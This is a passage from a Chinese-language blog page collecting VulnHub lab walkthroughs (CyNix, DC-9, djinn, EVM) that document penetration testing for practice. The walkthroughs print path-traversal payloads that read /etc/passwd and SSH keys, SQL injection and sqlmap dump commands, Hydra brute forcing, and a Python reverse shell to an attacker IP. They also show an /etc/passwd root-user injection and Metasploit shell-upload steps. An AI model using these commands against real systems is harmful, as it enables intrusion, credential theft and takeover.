+<p>右上角有个contact 就会到下面的联系界面 如下</p>
+<img data-src="/images/vulnhub/CyNix img/5.png" style="zoom:50%;" />
+
+<p>emm 先尝试了一波 什么都没有 又查看了一下源码 也什么都没有 再抓个包试试  抓包就会看到有东西了 这里会看到数据post到了canyoubypassme.php</p>
+<img data-src="/images/vulnhub/CyNix img/6.png" style="zoom:80%;" />
+
+<p>页面长这样  还是动态的  首先查看一下源码 注意到一个东西</p>
+<img data-src="/images/vulnhub/CyNix img/7.png" style="zoom:50%;" />
+
+<img data-src="C:\Users\Administrator\Desktop\Folders\blog\CyNix img\8.png" style="zoom:150%;" />
+
+<p>那我想应该页面会有个输入框输入数字啊 怎么没有呢  f12查看一下元素 </p>
+<p>果然 有个东西设置了透明 给他设置成1.0 就可以看到了</p>
+<img data-src="/images/vulnhub/CyNix img/9.png" style="zoom:50%;" />
+
+<p>然后看到代码里面 有个file 抓个包试试  猜这里应该有个文件读取</p>
+<img data-src="/images/vulnhub/CyNix img/10.png" style="zoom:80%;" />
+
+<p>果然 先读一下/etc/passwd  但是读取不成功</p>
+<img data-src="/images/vulnhub/CyNix img/11.png" style="zoom:80%;" />
+
+<p>这里应该是要自己构造payload来bypass 直接用字典fuzz就行</p>
+<p>找出来一个这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/CyNix img/12.png" style="zoom:80%;" />
+
+<p>注意到这里有个用户ford和lxd</p>
+<p>先用ssh登录用户ford试试  拒绝连接 后面有个publickey 应该和ssh密钥有关</p>
+<img data-src="/images/vulnhub/CyNix img/14.png" style="zoom:80%;" />
+
+<p>那就可以先读一下用户的ssh密钥</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;ford&#x2F;.ssh&#x2F;id_rsa</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/CyNix img/15.png" style="zoom:50%;" />
+
+<p>复制到攻击机的id_rsa文件里面 然后指定秘钥文件登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh ford@192.168.0.106 -p 6688 -i id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>这里还要注意一点 id_rsa文件还要修改权限为700 才可登录 下面登录成功</p>
+<p>下面就是提权了  注意到之前读取passwd文件的时候  有个lxd 提权应该靠它了</p>
+<img data-src="/images/vulnhub/CyNix img/17.png" style="zoom:50%;" />
+
+<p>还是先查看一下SUID权限可执行文件 查看权限等等 都没有啥有用的东西</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">sudo -l </span><br><span class="line">cat &#x2F;etc&#x2F;crontab</span><br></pre></td></tr></table></figure>
+
+<p>那就还是使用lxd提权  先在kali本机上生成一个镜像</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;saghul&#x2F;lxd-alpine-builder.git</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/CyNix img/18.png" style="zoom:60%;" />
+
+<p>生成后再在本机用python开启http服务 然后在靶机上面wget下载</p>
+<img data-src="/images/vulnhub/CyNix img/19.png" style="zoom:60%;" />
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lxc image import .&#x2F;alpine-v3.11-x86_64-20200212_0116.tar.gz --alias osloimage</span><br><span class="line">lxc image list</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/CyNix img/20.png" style="zoom:60%;" />
+
+<p>然后在新的容器中出初始化镜像 然后在/root目录加载初始化后的容器</p>
+<img data-src="/images/vulnhub/CyNix img/21.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/CyNix img/22.png" style="zoom:60%;" />
+
+<p>By oslo(A fake hacker)</p>
+<h1 id="DC-9-Walkthrough"><a href="#DC-9-Walkthrough" class="headerlink" title="DC-9 Walkthrough"></a>DC-9 Walkthrough</h1><p>第一步还是先Virtualbox导入靶机  然后正常开启就行了  这次是个Debian</p>
+<p>然后nmap扫一下确定靶机IP：192.168.0.114  先访问一下看看</p>
+<img data-src="/images/vulnhub/DC-9 img/1.png" style="zoom:60%;" />
+
+<p>页面长这样</p>
+<img data-src="/images/vulnhub/DC-9 img/2.png" style="zoom:50%;" />
+
+<p>然后扫一下端口  就开日常的22和80端口  没啥特殊的 就不放图了</p>
+<p>然后扫一下目录 dirsearch和gobuster  扫完之后只有一些常规页面 没有其他敏感信息</p>
+<img data-src="/images/vulnhub/DC-9 img/3.png" style="zoom:50%;" />
+
+<p>但是发现有个search.php  查询页面  会不会有注入呢？ 试一下</p>
+<p>提示输入first name或者last name进行查询  测试一下发现出来了所有人的信息 这里存在注入 先用burpsuite抓一下包  然后用sqlmap跑数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mary&#39;or &#39;1&#39;&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/DC-9 img/4.png" style="zoom:50%;" />
+
+<p>然后将post包数据复制到txt文件里  用sqlmap跑数据库</p>
+<img data-src="/images/vulnhub/DC-9 img/5.png" style="zoom:50%;" />
+
+<p>然后就跑sqlmap  三个数据库  跑一下Staff和users</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 sqlmap.py -r oslo.txt --dbs</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/DC-9 img/6.png" style="zoom:50%;" />
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 sqlmap.py -r oslo.txt -D users --tables</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/DC-9 img/7.png" style="zoom:50%;" />
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 sqlmap.py -r oslo.txt -D users -T UserDetails --columns</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/DC-9 img/8.png" style="zoom:50%;" />
+
+<p>然后直接所有数据dump下来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -3 sqlmap.py -r oslo.txt -D users -T UserDetails --dump</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/DC-9 img/9.png" style="zoom:50%;" />
+
+<p>在跑一下Staff数据库  更上面是一样的</p>
+<img data-src="/images/vulnhub/DC-9 img/10.png" style="zoom:50%;" />
+
+<img data-src="/images/vulnhub/DC-9 img/11.png" style="zoom:50%;" />
+
+<p>这里有个admin的账号和密码  密码是hash 但是sqlmap有自带的简单hash破解 可以先试一下</p>
+<img data-src="/images/vulnhub/DC-9 img/12.png" style="zoom:50%;" />
+
+<p>得到一个admin/transorbital1</p>
+<p>网站有个登录页面  登录试试  登录进去了 下面有个很显眼的提示文件不存在</p>
+<img data-src="/images/vulnhub/DC-9 img/13.png" style="zoom:50%;" />
+
+
+
+<p>这里应该可以任意文件读取 构造参数如下  先读一下用户文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p>可以看到都是和之前跑出来的数据库里的用户是对应的</p>
+<img data-src="/images/vulnhub/DC-9 img/14.png" style="zoom:50%;" />
+
+<p>那么我们就可以进行下一步的撞库了 分别新建一个user.txt和pass.txt</p>
+<img data-src="/images/vulnhub/DC-9 img/15.png" style="zoom:50%;" />
+
+<p>然后我们用Hydra来爆破ssh登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt 192.168.0.114 ssh</span><br></pre></td></tr></table></figure>
+
+<p>然后拒绝连接 emm…</p>
+<img data-src="/images/vulnhub/DC-9 img/16.png" style="zoom:50%;" />
+
+<p>我们又看到最开始扫端口的地方 22端口的状态的filtered 连接会被过滤</p>
+<p>后门google了一波  才知道要先端口敲门 有一串特定的序列在 /etc/knockd.conf 文件中 因为靶机使用了knockd来进行防护</p>
+<p>先读配置文件 </p>
+<p>![](/images/vulnhub/DC-9 img/17.png)</p>
+<p>然后进行端口敲门</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">knock 192.168.0.114 7469 8475 9842</span><br></pre></td></tr></table></figure>
+
+<p>然后在hydra爆破登录     找到三个可登录用户</p>
+<img data-src="/images/vulnhub/DC-9 img/18.png" style="zoom:60%;" />
+
+<p>先每个登录一遍  只有登录第三个用户时发现有东西了</p>
+<p>发现一个存储密码的文件</p>
+<img data-src="/images/vulnhub/DC-9 img/19.png" style="zoom:60%;" />
+
+<p>然后查看权限 sudo -l  会发现一个无需root密码执行的test文件</p>
+<img data-src="/images/vulnhub/DC-9 img/20.png" style="zoom:60%;" />
+
+<p>先查看一下test.py文件的内容 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">if len(sys.argv) !&#x3D; 3:</span><br><span class="line">	print(&quot;Usage: python test.py read append&quot;)</span><br><span class="line">	sys.exit(1)</span><br><span class="line">else:</span><br><span class="line">	f &#x3D; open(sys.argv[1], &quot;r&quot;)</span><br><span class="line">	output &#x3D; (f.read())</span><br><span class="line">	</span><br><span class="line">	f &#x3D; open(sys.argv[2], &quot;a&quot;)</span><br><span class="line">	f.write(output)</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure>
+
+<p>看一下代码不难发现 这是将第一个参数文件名中的内容写入到第二个文件中</p>
+<p>这里我们就可以用openssl生成一个root用户 然后写进/etc/passwd/文件中</p>
+<p>然后切换用户就是root了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt oslo 123456</span><br><span class="line">echo &#39;oslo:$1$oslo$qv9M3fBmtDPrOTBZflNl81:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;tmp&#x2F;osl</span><br><span class="line">sudo test &#x2F;tmp&#x2F;osl &#x2F;etc&#x2F;passwd</span><br><span class="line">su oslo</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/DC-9 img/21.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/DC-9 img/22.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/DC-9 img/23.png" style="zoom:60%;" />
+
+<p>By oslo(A fake hacker)</p>
+<h1 id="djinn-Walkthrough"><a href="#djinn-Walkthrough" class="headerlink" title="djinn Walkthrough"></a>djinn Walkthrough</h1><p>第一步先打开靶机  </p>
+<p>这次是个ubuntu的靶机 先确定一下IP</p>
+<img data-src="/images/vulnhub/djinn img/1.png" style="zoom:60%;" />
+
+<p>浏览器访问一下 看看页面  浏览器访问不了 还是先扫一下端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -sV -T5 -A -p- 192.168.0.114</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/djinn img/2.png" style="zoom:60%;" />
+
+<p>又有个匿名ftp登录的 还有三个文件</p>
+<p>还有其他的1337 7331端口开着  后面再看这些端口什么用</p>
+<img data-src="/images/vulnhub/djinn img/3.png" style="zoom:60%;" />
+
+<p>先匿名ftp看一下  先下载哪三个文件下来看看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.114</span><br></pre></td></tr></table></figure>
+
+<p>用户名和密码都填ftp就行 然后下载三个文件下来看看</p>
+<img data-src="/images/vulnhub/djinn img/4.png" style="zoom:60%;" />
+
+<p>然后在kali机上面查看一下 提示在1337有个游戏 还得到一个用户名nitish81299</p>
+<img data-src="/images/vulnhub/djinn img/5.png" style="zoom:60%;" />
+
+<p>然后我们直接telnet1377端口看看</p>
+<img data-src="/images/vulnhub/djinn img/6.png" style="zoom:60%;" />
+
+<p>发现就是不断做数学题  要做1000次  这不可能啊 再去看看其他的 先去看了看7331端口的http页面 然后用dirsearch还有gobuster跑一遍目录 </p>
+<p>![](/images/vulnhub/djinn img/7.png)</p>
+<img data-src="/images/vulnhub/djinn img/8.png" style="zoom:60%;" />
+
+<p>然后访问一下  发现是个命令执行的页面  执行命令后返回如下</p>
+<img data-src="/images/vulnhub/djinn img/9.png" style="zoom:60%;" />
+
+<p> 然后ping一下我的kali机  发现不行  应该被过滤了</p>
+<img data-src="/images/vulnhub/djinn img/10.png" style="zoom:60%;" />
+
+<p>然后再抓包看看 什么命令可以执行 什么不可以执行</p>
+<img data-src="/images/vulnhub/djinn img/11.png" style="zoom:60%;" />
+
+<p>上面我们使用了echo whoami 说明echo可以执行</p>
+<p>下面我们对getshell的 payoad进行base64编码 然后使用echo命令执行 kali机监听端口 看看是否反弹端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.104&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/djinn img/12.png" style="zoom:60%;" />
+
+<p>确实getshell了</p>
+<p>然后去到/home目录下发现了个用户 一个nitish 一个sam</p>
+<p>在nitish下有个user.txt 但是没有权限进入sam目录</p>
+<img data-src="/images/vulnhub/djinn img/13.png" style="zoom:60%;" />
+
+<p>那么下面我们就应该是要切换用用户sam 然后再去找提权的东西了</p>
+<p>然后我们还在nitish目录下发现了nitish用户的密码</p>
+<img data-src="/images/vulnhub/djinn img/14.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/djinn img/15.png" style="zoom:60%;" />
+
+<p>然后执行了suod -l后发现一个可以以sam权限执行的文件</p>
+<img data-src="/images/vulnhub/djinn img/16.png" style="zoom:60%;" />
+
+<p>先执行一遍 看看是什么东西</p>
+<img data-src="C:\Users\Administrator\Desktop\Folders\blog\djinn img\17.png" style="zoom:60%;" />
+
+<p>给出了使用说明书 一个一个执行一遍 发现都不能获取sam的权限shell</p>
+<p>然后使用了man命令查看完整的说明书 发现了一个参数 cmd</p>
+<img data-src="/images/vulnhub/djinn img/18.png" style="zoom:60%;" />
+
+<p>然后在cmd参数后面跟上命令 就直接到了sam用户权限</p>
+<img data-src="/images/vulnhub/djinn img/19.png" style="zoom:60%;" />
+
+<p>然后再次查看sudo -l 又发现一个lago文件</p>
+<img data-src="/images/vulnhub/djinn img/20.png" style="zoom:60%;" />
+
+<p>再次执行了一遍</p>
+<img data-src="/images/vulnhub/djinn img/21.png" style="zoom:60%;" />
+
+<p>发现每个功能都不能成功实现 那就去看看源码 在sam用户名目录下发现了一个pyc文件 这是py文件编译后的文件 需要源码的话 我们可以将pyc文件下载到本地 然后在线反编译就可以了</p>
+<img data-src="/images/vulnhub/djinn img/22.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/djinn img/23.png" style="zoom:60%;" />
+
+<p>在线反编译后看源码 发现只有一个函数是真正有用的 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def guessit():</span><br><span class="line">    num &#x3D; randint(1, 101)</span><br><span class="line">    print &#39;Choose a number between 1 to 100: &#39;</span><br><span class="line">    s &#x3D; input(&#39;Enter your number: &#39;)</span><br><span class="line">    if s &#x3D;&#x3D; num:</span><br><span class="line">        system(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">    else:</span><br><span class="line">        print &#39;Better Luck next time&#39;</span><br></pre></td></tr></table></figure>
+
+<p>这里在input这里有个漏洞 </p>
+<p>直接输入变量名就是导致条件成立  然后获取shell</p>
+<img data-src="/images/vulnhub/djinn img/24.png" style="zoom:60%;" />
+
+<img data-src="/images/vulnhub/djinn img/25.png" style="zoom:60%;" />
+
+<p>By oslo(A fake hacker)</p>
+<h1 id="VulnHub-EVM-WalkThrough"><a href="#VulnHub-EVM-WalkThrough" class="headerlink" title="VulnHub EVM WalkThrough"></a>VulnHub EVM WalkThrough</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">靶机地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;evm-1,391&#x2F;</span><br><span class="line">靶机说明：This is super friendly box intended for Beginner&#39;s</span><br><span class="line">这次是一个很简单的靶机 考试之前做来玩玩</span><br></pre></td></tr></table></figure>
+
+<p>下载ova文件后使用virtualbox打开 先用namp确定IP</p>
+<img data-src="/images/vulnhub/EVM Iimg/1.png" style="zoom:50%;" />
+
+<p>同时也可以扫一下端口 都是一些默认的服务端口</p>
+<img data-src="/images/vulnhub/EVM Iimg/2.png" style="zoom:50%;" />
+
+<p>有了IP 浏览器访问地址 得到一个apach的more界面</p>
+<img data-src="/images/vulnhub/EVM Iimg/3.png" style="zoom:50%;" />
+
+<p>还是常规套路 先信息收集 这个是简单靶机的话 就先扫一下目录</p>
+<p>先用的dirsearech扫了一下 有个index.html和info.php 都看了一下 没什么特殊的</p>
+<p>然后用dirb扫了一下 发现了网站框架是wordpress</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.1.106</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/EVM Iimg/4.png" style="zoom:50%;" />
+
+<p>然后就可以用wpscan扫一下用户和密码了 先扫用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.1.106&#x2F;wordpress -e u</span><br></pre></td></tr></table></figure>
+
+<p>扫到一个c0rrupt3d_brain</p>
+<img data-src="/images/vulnhub/EVM Iimg/5.png" style="zoom:50%;" />
+
+<p>然后在用字典跑一下密码 密码：24992499</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.1.106&#x2F;wordpress -U c0rrupt3d_brain -P &#x2F;root&#x2F;桌面&#x2F;passwd.txt</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/EVM Iimg/6.png" style="zoom:50%;" />
+
+<p>然后就可以用msf使用wp的漏洞来反弹shell了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;unix&#x2F;webapp&#x2F;wp_admin_shell_upload</span><br><span class="line">set rhosts 192.168.1.106</span><br><span class="line">set username c0rrupt3d_brain</span><br><span class="line">ser password 24992499</span><br><span class="line">set targeturi &#x2F;wordpress</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>ok 返回了meterpreter</p>
+<img data-src="/images/vulnhub/EVM Iimg/7.png" style="zoom:50%;" />
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home</span><br><span class="line">ls</span><br><span class="line">cd root3r</span><br><span class="line">ls</span><br><span class="line">cat .root_password_ssh.txt</span><br><span class="line">找到root密码：willy26</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/EVM Iimg/8.png" style="zoom:50%;" />
+
+<p>然后创建交互式shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+<img data-src="/images/vulnhub/EVM Iimg/9.png" style="zoom:50%;" />
+
+<p>root密码就是刚刚的willy26 就这么提权就完了</p>
+<img data-src="/images/vulnhub/EVM Iimg/10.png" style="zoom:50%;" />
+
+<p> By Oslo(A fake hacker) </p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+            <div class="social-item">
+              <a target="_blank" class="social-link" href="/atom.xml">
+                <span class="icon">
+                  <i class="fa fa-rss"></i>
+                </span>
+
+                <span class="label">RSS</span>
+              </a>
+            </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/VulnHub/" rel="tag"><i class="fa fa-tag"></i> VulnHub</a>
+              <a href="/tags/Walkthrough/" rel="tag"><i class="fa fa-tag"></i> Walkthrough</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/18/SqlMap%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/" rel="prev" title="SqlMap使用小记">
+      <i class="fa fa-chevron-left"></i> SqlMap使用小记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/03/18/VulnHub-Walkthrough-%E4%BA%8C/" rel="next" title="VulnHub Walkthrough(二)">
+      VulnHub Walkthrough(二) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#十篇-walkthrough"><span class="nav-number">1.</span> <span class="nav-text">十篇 walkthrough</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Bottleneck-walkthrough"><span class="nav-number">2.</span> <span class="nav-text">Bottleneck walkthrough</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#写在前面：P"><span class="nav-number">2.1.</span> <span class="nav-text">写在前面：P</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#靶场简介"><span class="nav-number">2.2.</span> <span class="nav-text">靶场简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-信息收集"><span class="nav-number">2.3.</span> <span class="nav-text">0x00 信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-LFI利用点"><span class="nav-number">2.4.</span> <span class="nav-text">0x01 LFI利用点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-input-getshell"><span class="nav-number">2.5.</span> <span class="nav-text">0x02 input+getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-提升用户权限"><span class="nav-number">2.6.</span> <span class="nav-text">0x03 提升用户权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-提权到root权限"><span class="nav-number">2.7.</span> <span class="nav-text">0x04 提权到root权限</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CyNix-Walkthrough"><span class="nav-number">3.</span> <span class="nav-text">CyNix Walkthrough</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DC-9-Walkthrough"><span class="nav-number">4.</span> <span class="nav-text">DC-9 Walkthrough</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#djinn-Walkthrough"><span class="nav-number">5.</span> <span class="nav-text">djinn Walkthrough</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#VulnHub-EVM-WalkThrough"><span class="nav-number">6.</span> <span class="nav-text">VulnHub EVM WalkThrough</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Oslo"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Oslo</p>
+  <div class="site-description" itemprop="description">You guilty , You died</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Oslo</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">35k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">32 分钟</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
